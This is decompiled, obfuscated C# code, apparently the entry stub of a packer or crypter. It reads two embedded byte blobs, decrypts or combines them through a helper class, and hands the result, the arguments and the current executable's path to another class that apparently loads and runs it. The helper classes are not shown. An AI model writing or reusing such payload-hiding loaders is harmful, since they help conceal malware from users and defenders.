using System.Diagnostics;
using ns13;
using ns7;
using ns8;
using ns9;

namespace ns10;

internal class Class27 : Class23
{
	public Class27()
	{
		Class33.smethod_0();
		base._002Ector();
	}

	public override object vmethod_0(object[] object_0)
	{
		Class22.class23_0 = new Class28();
		byte[] array = (byte[])Class22.class23_0.vmethod_0(new object[1] { 100 });
		byte[] array2 = (byte[])Class22.class23_0.vmethod_0(new object[1] { 101 });
		if (array.Length > 0 && array2.Length > 0)
		{
			Class22.class23_0 = new Class29();
			byte[] array3 = (byte[])Class22.class23_0.vmethod_0(new object[2] { array2, array });
			if (array3.Length <= 0)
			{
				return null;
			}
			if (object_0.Length <= 0)
			{
				object_0 = new object[1] { new string[1] };
			}
			Class22.class23_0 = new Class24();
			Class22.class23_0.vmethod_0(new object[3]
			{
				array3,
				(string[])object_0[0],
				Process.GetCurrentProcess().MainModule!.FileName
			});
			return null;
		}
		return null;
	}
}
